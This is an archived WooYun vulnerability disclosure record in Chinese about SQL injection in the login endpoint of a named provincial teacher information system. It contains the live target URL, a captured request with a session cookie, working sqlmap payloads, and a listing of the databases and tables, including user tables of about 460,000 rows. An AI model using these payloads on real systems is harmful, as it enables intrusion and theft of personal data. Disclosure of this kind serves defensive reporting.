{"id": 57073, "wybug_id": "wooyun-2014-055402", "wybug_title": "某省教师信息管理系统SQL注入", "wybug_corp": "某省教师网", "wybug_author": "m_vptr", "wybug_date": "2014-04-03 14:17", "wybug_open_date": "2014-05-18 14:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-18：\t细节向公众公开  简要描述： SQL注入 详细说明：  http://www.jxteacher.com/admin/index.aspx 登录是一个ajax get请求http://www.jxteacher.com/Ajax/login.aspx?username=360121026019110153&userpwd=1&resultType=json，url参数username可被注入   漏洞证明：  抓包\nGET /Ajax/login.aspx?username=360121026019110153&userpwd=1&resultType=json HTTP/1.1Host: www.jxteacher.comProxy-Connection: keep-aliveAccept: */*X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36Referer: http://www.jxteacher.com/Login.aspx?ReturnUrl=%2fadmin%2fadmin_index.aspxAccept-Encoding: gzip,deflate,sdchAccept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4Cookie: ASP.NET_SessionId=novdyumhscp0t3ekb1wxls0i; UrlRef=http://www.jxteacher.com/admin/index.aspx\n扫描报告\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: username    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: username=360121026019110153' AND 7978=7978 AND 'ZdHb'='ZdHb&userpwd=1&resultType=json    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: username=360121026019110153' AND 6923=CONVERT(INT,(SELECT CHAR(113)+CHAR(110)+CHAR(97)+CHAR(121)+CHAR(113)+(SELECT (CASE WHEN (6923=6923) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(104)+CHAR(112)+CHAR(116)+CHAR(113))) AND 'SRyP'='SRyP&userpwd=1&resultType=json    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: username=360121026019110153'; WAITFOR DELAY '0:0:5'--&userpwd=1&resultType=json    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: username=360121026019110153' WAITFOR DELAY '0:0:5'--&userpwd=1&resultType=json---[12:58:49] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008\n列库\navailable databases [5]:[*] jxteacher2012[*] master[*] model[*] msdb[*] tempdb\n列表\nweb server operating system: Windows 2008web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008Database: jxteacher2012+------------------------------------------------------+---------+| Table                                                | Entries |+------------------------------------------------------+---------+| dbo.Cms_Contents                                     | 3700939 || dbo.vw_Cms_Columns_Contents                          | 3700939 || dbo.vw_CmsContentColumns                             | 3700939 || dbo.vw_SiteColumnUserContents                        | 3700938 || dbo.vw_CmsContentOneTwo                              | 3691856 || dbo.vw_cms_sites_columns_contents                    | 3691827 || dbo.vw_CmsContentColumnTexts                         | 3689861 || dbo.vw_CmsContentOneTwoText                          | 3689860 || dbo.dnt_posts1                                       | 2646014 || dbo.Blog_Topics                                      | 2056632 || dbo.vw_Blog_TopicList                                | 2055570 || dbo.vw_Blog_TopicOne                                 | 2055570 || dbo.vw_BlogContentColumns                            | 2055570 || dbo.vw_Topics                                        | 2055570 || dbo.Site_Logs                                        | 1871634 || dbo.vw_ContentIdSiteIdNoEquals                       | 1230633 || dbo.dnt_topics                                       | 808772  || dbo.vw_BlogUserTags                                  | 789791  || dbo.Blog_Users_Tags                                  | 789691  || dbo.Cms_Comments                                     | 618044  || dbo.vw_ContentComments                               | 617564  || dbo.vw_aspnet_MembershipUsers                        | 503758  || dbo.aspnet_UsersInRoles                              | 500279  || dbo.vw_aspnet_UsersInRoles                           | 500279  || dbo.aspnet_Users                                     | 463782  || 略。。。| dbo.vw_Course_CurrTeamUserInfo_Users                 | 1       || dbo.vw_Course_CurrTemasUser_UserInfo                 | 1       || dbo.vw_Replys_Comment_Reply_UserInfo                 | 1       || dbo.vw_Replys_QueGetScore                            | 1       |+------------------------------------------------------+---------+\n   修复方案：  你懂的   版权声明：转载请注明来源 m_vptr@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2014-04-08 08:36 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给江西分中心处置，涉及用户信息泄露风险，rank 14 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}